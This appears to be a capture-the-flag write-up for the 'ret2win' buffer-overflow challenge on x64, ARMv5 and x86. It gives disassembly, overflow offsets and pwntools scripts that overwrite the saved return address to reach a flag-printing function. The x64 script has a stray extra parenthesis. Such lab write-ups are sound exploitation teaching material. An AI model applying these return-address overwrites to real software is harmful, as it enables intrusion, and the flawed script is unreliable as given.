# retwin

56 bytes of use input into 32 bytes of stack buffer using read()

## x64

using nm to check method names

```bash
$ nm ret2win|grep ' t '
00000000004005f0 t deregister_tm_clones
0000000000400660 t __do_global_dtors_aux
0000000000400690 t frame_dummy
00000000004006e8 t pwnme
0000000000400620 t register_tm_clones
0000000000400756 t ret2win
```

so there is a method called ret2w. if we use r2 to analyze this method

```bash
$ r2 ret2win
[0x004005b0]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[0x004005b0]> s sym.ret2win
[0x00400756]> pdf
┌ 27: sym.ret2win ();
│   0x00400756      55             push rbp
│   0x00400757      4889e5         mov rbp, rsp
│   0x0040075a      bf26094000     mov edi, str.Well_done__Heres_your_flag: ; 0x400926 ; "Well done! Here's your flag:"
│   0x0040075f      e8ecfdffff     call sym.imp.puts           ; int puts(const char *s)
│   0x00400764      bf43094000     mov edi, str._bin_cat_flag.txt ; 0x400943 ; "/bin/cat flag.txt"
│   0x00400769      e8f2fdffff     call sym.imp.system         ; int system(const char *string)
│   0x0040076e      90             nop
│   0x0040076f      5d             pop rbp
└   0x00400770      c3             ret

```

so our goal is to achieve execution of this method. to confirm how many bytes are needed to cause an overflow

```bash
$ sudo dmesg -C
$ ./ret2win
$> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBB # 40A and 5B
$ sudo dmesg -t
ret2win[3560]: segfault at a4242424242 ip 00000a4242424242 sp 00007ffeb07e89e0 error 14 in libc-2.31.so[7ff398551000+25000]
Code: Unable to access opcode bytes at RIP 0xa4242424218.
```

*will typically need 40 bytes of garbage to reach the saved return address in the x64, 44 bytes for x86, and 36 bytes for ARMv5 and MIPS.*


the 5 B's overflow into the RIP which is why it segfaults since that address doesn't exist. given the target address is `0x00400756`

the payload will be `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA + 0x00400756`. in a pwntools script

```py
#!/usr/bin/env python3

from pwn import *

binary = ELF("./ret2win")
context.binary = binary
rop = ROP(binary)

p = process(binary.path))
p.recvuntil(b">")

rop.raw(b"A"*40)
rop.raw(0x00400756)
p.sendline(rop.chain())
p.recv()
p.recv()
print(p.recv())
```

`ROPE{a_placeholder_32byte_flag!}`


## ARMv5

r2

```bash
$ r2 ret2win_armv5
...
┌ 32: sym.ret2win ();
│   0x000105ec      push {fp, lr}
│   0x000105f0      add fp, sp, 4
│   0x000105f4      ldr r0, [str.Well_done__Heres_your_flag:]  ; [0x1060c:4]=0x107a0 str.Well_done__Heres_your_flag: ; "Well done! Here's your flag:"
│   0x000105f8      bl sym.imp.puts                            ; int puts(const char *s)
│                                                                      ; int puts("Well done! Here's your flag:")
│   0x000105fc      ldr r0, [str._bin_cat_flag.txt]            ; [0x10610:4]=0x107c0 str._bin_cat_flag.txt ; "/bin/cat flag.txt"
│   0x00010600      bl sym.imp.system                          ; int system(const char *string)
│                                                                      ; int system("/bin/cat flag.txt")
│   0x00010604      mov r0, r0                                 ; "/bin/cat flag.txt" str._bin_cat_flag.txt
└   0x00010608      pop {fp, pc}
```

we cant use gdb (gef) to debug since its ARMv5, so we gotta use pwntools

```bash
$ pwn debug --exec ret2win_armv5
# opened up a new window and starts debugging session within gef in that window
# program input is in original window
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBB
```

The $pc is overflowed and is now `0x42424242` which same as x86 $(R|E)IP. Comparing this to the x64 $RIP which was `0x00000a4242424242` 16 in length, but ARM32 is half that. but nothing really needs to be done differently because pwntools handles different archs.

The target address is `0x000105ec`, so the pwntools script is:

```py
#!/usr/bin/env python3

from pwn import *

binary = ELF("./ret2win_armv5")
context.binary = binary
rop = ROP(binary)

p = process(binary.path)
p.recvuntil(b">")

rop.raw(b"A"*36)
rop.raw(0x000105ec)
p.sendline(rop.chain())
p.recv()
p.recv()
print(p.recv().decode("utf-8").strip("\n"))
```

yielding flag `ROPE{a_placeholder_32byte_flag!}`


## x86

using r2:

```bash
$ r2 ret2win32    
[0x08048430]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[0x08048430]> s sym.ret2win
[0x0804862c]> pdf
┌ 41: sym.ret2win ();
│   0x0804862c      55             push ebp
│   0x0804862d      89e5           mov ebp, esp
│   0x0804862f      83ec08         sub esp, 8
│   0x08048632      83ec0c         sub esp, 0xc
│   0x08048635      68f6870408     push str.Well_done__Heres_your_flag: ; 0x80487f6 ; "Well done! Here's your flag:"
│   0x0804863a      e891fdffff     call sym.imp.puts           ; int puts(const char *s)
│   0x0804863f      83c410         add esp, 0x10
│   0x08048642      83ec0c         sub esp, 0xc
│   0x08048645      6813880408     push str._bin_cat_flag.txt  ; 0x8048813 ; "/bin/cat flag.txt"
│   0x0804864a      e891fdffff     call sym.imp.system         ; int system(const char *string)
│   0x0804864f      83c410         add esp, 0x10
│   0x08048652      90             nop
│   0x08048653      c9             leave
└   0x08048654      c3             ret
```

the target address is `0x0804862c`. the python script is:


```py
#!/usr/bin/env python3

from pwn import *

binary = ELF("./ret2win32")
context.binary = binary
rop = ROP(binary)

p = process(binary.path)
p.recvuntil(b">")

rop.raw(b"A"*44)
rop.raw(0x0804862c)
p.sendline(rop.chain())
p.recv()
p.recv()
print(p.recv().decode("utf-8").strip("\n"))
```

which yields flag `ROPE{a_placeholder_32byte_flag!}`.
